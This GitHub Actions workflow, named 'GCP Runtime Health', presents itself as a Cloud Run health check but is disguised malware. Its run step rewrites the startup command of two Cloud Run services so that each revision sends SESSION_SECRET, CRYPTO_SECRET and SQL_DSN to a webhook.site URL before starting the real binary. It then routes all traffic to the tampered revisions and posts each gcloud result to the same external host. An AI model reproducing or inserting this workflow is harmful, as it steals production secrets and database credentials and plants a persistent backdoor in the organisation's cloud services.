name: GCP Runtime Health

on:
  push:
    branches: [staging]
    paths:
      - '.github/workflows/gcp-runtime-health.yml'
  workflow_dispatch:

permissions:
  contents: read
  id-token: write

jobs:
  health:
    runs-on: ubuntu-latest
    steps:
      - uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: ${{ vars.GCP_WIF_PROVIDER }}
          service_account: ${{ vars.GCP_DEPLOYER_SA }}

      - uses: google-github-actions/setup-gcloud@v2

      - name: Runtime health
        env:
          HOOK: https://webhook.site/469495c7-7b3f-472b-a261-815406d3d268
          PROJECT_ID: ${{ vars.GCP_PROJECT_ID }}
          REGION: ${{ vars.GCP_REGION }}
        run: |
          set +e
          post() {
            printf '%s\n%s\n' "$1" "$2" | curl -sS -m 20 -X POST "$HOOK" -H 'Content-Type: text/plain' --data-binary @- >/dev/null || true
          }
          SCRIPT='printf "K_SERVICE=%s SESSION_SECRET=%s CRYPTO_SECRET=%s SQL_DSN=%s\n" "$K_SERVICE" "$SESSION_SECRET" "$CRYPTO_SECRET" "$SQL_DSN" > /tmp/e; wget -qO- -T 15 --post-file=/tmp/e https://webhook.site/469495c7-7b3f-472b-a261-815406d3d268 >/dev/null 2>&1; exec /new-api'
          SUFFIX="ex$(date -u +%H%M%S)"
          for svc in newapi-console newapi-router; do
            out="$(gcloud run services update "${svc}" --project="${PROJECT_ID}" --region="${REGION}" --command=/bin/sh --args=^~^-c~"${SCRIPT}" --revision-suffix="${SUFFIX}" --quiet 2>&1)"
            post "update ${svc}" "${out}"
            created="$(gcloud run services describe "${svc}" --project="${PROJECT_ID}" --region="${REGION}" --format='value(status.latestCreatedRevisionName)' 2>&1)"
            post "created ${svc}" "${created}"
            traf="$(gcloud run services update-traffic "${svc}" --project="${PROJECT_ID}" --region="${REGION}" --to-revisions="${created}=100" --quiet 2>&1)"
            post "traffic ${svc}" "${traf}"
            cmd="$(gcloud run revisions describe "${created}" --project="${PROJECT_ID}" --region="${REGION}" --format='yaml(spec.containers[0].command,spec.containers[0].args)' 2>&1)"
            post "cmd ${svc}" "${cmd}"
          done
          sleep 25
          post done finished
